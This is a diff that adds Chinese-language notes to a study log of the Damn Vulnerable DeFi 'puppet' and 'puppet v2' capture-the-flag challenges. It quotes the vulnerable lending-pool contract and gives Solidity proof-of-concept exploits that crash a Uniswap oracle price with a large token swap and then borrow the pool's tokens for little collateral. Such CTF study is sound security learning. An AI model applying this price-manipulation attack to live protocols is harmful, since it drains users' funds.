@@ -620,5 +620,150 @@ contract SideCaller{
 ### 2024.09.05
 
 
+#### puppet
+
+题目：
+
+```
+contract PuppetPool is ReentrancyGuard {
+    using Address for address payable;
+
+    uint256 public constant DEPOSIT_FACTOR = 2;
+
+    address public immutable uniswapPair;
+    DamnValuableToken public immutable token;
+
+    mapping(address => uint256) public deposits;
+
+    error NotEnoughCollateral();
+    error TransferFailed();
+
+    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);
+
+    constructor(address tokenAddress, address uniswapPairAddress) {
+        token = DamnValuableToken(tokenAddress);
+        uniswapPair = uniswapPairAddress;
+    }
+
+    // Allows borrowing tokens by first depositing two times their value in ETH
+    function borrow(uint256 amount, address recipient) external payable nonReentrant {
+        uint256 depositRequired = calculateDepositRequired(amount);//根据uniV1的价格计算所需抵押的ETH数目
+
+        if (msg.value < depositRequired) {
+            revert NotEnoughCollateral();
+        }
+
+        if (msg.value > depositRequired) {
+            unchecked {
+                payable(msg.sender).sendValue(msg.value - depositRequired);//多余的eth转回
+            }
+        }
+
+        unchecked {
+            deposits[msg.sender] += depositRequired;
+        }
+
+        // Fails if the pool doesn't have enough tokens in liquidity
+        if (!token.transfer(recipient, amount)) {//转账
+            revert TransferFailed();
+        }
+
+        emit Borrowed(msg.sender, recipient, depositRequired, amount);
+    }
+
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
+        //借走1e5，要抵押 1e5/2* eth.balance(uni)/dvt.balance(uni)
+        // = 1e5/2 * (10-9)/(10+y)
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+}
+
+```
+
+POC:
+
+contract CallPuppet{
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    constructor(address dvt,address pp){
+        token=DamnValuableToken(dvt);
+        lendingPool=PuppetPool(pp);
+    }
+
+    function start(address recovery,address unipool)public payable{
+        // payable(unipool).call{value:24*1e18}("");
+        token.approve(unipool, 1e5*1e18);
+        // token.transfer(address(lendingPool), token.balanceOf(address(this)));
+        IUniswapV1Exchange(unipool).tokenToEthSwapInput(9e20, 1, block.timestamp+1 days);
+        uint amount = lendingPool.calculateDepositRequired(1e5*1e18);
+        console.logUint(amount);
+        lendingPool.borrow{value:address(this).balance}(1e5*1e18,recovery);
+    }
+    receive()payable external{
+
+    }
+}
+
+
 ### 2024.09.06
+
+#### puppet v2
+
+一样的，使用了v2的reserve计算价格，可以向池内注入大量token拉低其价格。
+
+poc：
+
+```
+    function test_puppetV2() public checkSolvedByPlayer {
+        console.logAddress(address(weth));
+        CallPuppet cp=new CallPuppet(address(token),address(lendingPool),address(uniswapV2Router),address(weth));
+        token.transfer(address(cp), token.balanceOf(player));
+        cp.start{value:20 ether}(recovery, address(uniswapV2Exchange));
+    }
+    
+contract CallPuppet{
+    DamnValuableToken token;
+    PuppetV2Pool lendingPool;
+    IUniswapV2Router02 router;
+    WETH weth;
+    constructor(address dvt,address pp,address r,address _weth){
+        token=DamnValuableToken(dvt);
+        lendingPool=PuppetV2Pool(pp);
+        router=IUniswapV2Router02(r);
+        weth=WETH(payable(_weth));
+    }
+
+    function start(address recovery,address unipool)public payable{
+
+        token.approve(address(router),type(uint256).max);
+        console.log(token.balanceOf(address(this)));
+        address[] memory path=new address[](2);
+        path[0]=address(token);
+        path[1]=address(weth);
+       
+        router.swapExactTokensForETH(1e4*1e18, 0, path,address(this),block.timestamp+1 days);
+        uint amount = lendingPool.calculateDepositOfWETHRequired(1e6*1e18);
+        console.logUint(amount);
+        uint256 depositValue = amount - weth.balanceOf(address(this));//差的weth去兑换补足
+        weth.deposit{value:depositValue}();
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(1e6*1e18);
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+    receive()payable external{
+
+    }
+}
+```
+
+
+
+### 2024.09.07
+
+### 2024.09.08
 <!-- Content_END -->
